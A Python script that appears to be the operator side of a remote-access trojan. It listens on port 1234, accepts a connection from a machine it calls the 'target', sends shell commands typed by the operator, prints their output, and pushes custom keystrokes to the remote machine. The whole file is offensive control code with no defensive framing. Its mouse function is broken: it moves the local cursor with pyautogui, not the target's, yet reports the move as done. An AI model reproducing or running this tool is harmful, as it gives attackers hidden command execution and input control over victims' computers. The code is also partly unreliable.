import socket
import pyautogui

def start_listener():
    host = '0.0.0.0'  # Listen on all available network interfaces
    port = 1234  # Port to listen on

    listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener_socket.bind((host, port))
    listener_socket.listen(1)  # Listen for incoming connections

    print('Listening for incoming connections...')

    target_socket, target_address = listener_socket.accept()
    print('Connection established from:', target_address)

    while True:
        command = input('\nShell> ')
        target_socket.send(command.encode())
        if command.lower() == 'exit':
            break

        response = receive_data(target_socket)
        print(response)

        action = input('Enter action (keystroke/mouse): ')
        if action.lower() == 'keystroke':
            keystrokes = input('Enter custom keystrokes (or "done" to exit): ')
            if keystrokes.lower() == 'done':
                break
            send_custom_keystrokes(target_socket, keystrokes)
        elif action.lower() == 'mouse':
            x, y = input('Enter x and y coordinates: ').split()
            send_mouse_movement(target_socket, int(x), int(y))
        else:
            print('Invalid action.')

    listener_socket.close()


def receive_data(sock):
    response = b''
    while True:
        data = sock.recv(1024)
        response += data
        if len(data) < 1024:
            break
    return response.decode()


def send_custom_keystrokes(sock, keystrokes):
    sock.sendall(keystrokes.encode())


def send_mouse_movement(sock, x, y):
    pyautogui.moveTo(x, y)
    sock.sendall(f'Mouse moved to ({x}, {y})'.encode())


if __name__ == '__main__':
    start_listener()
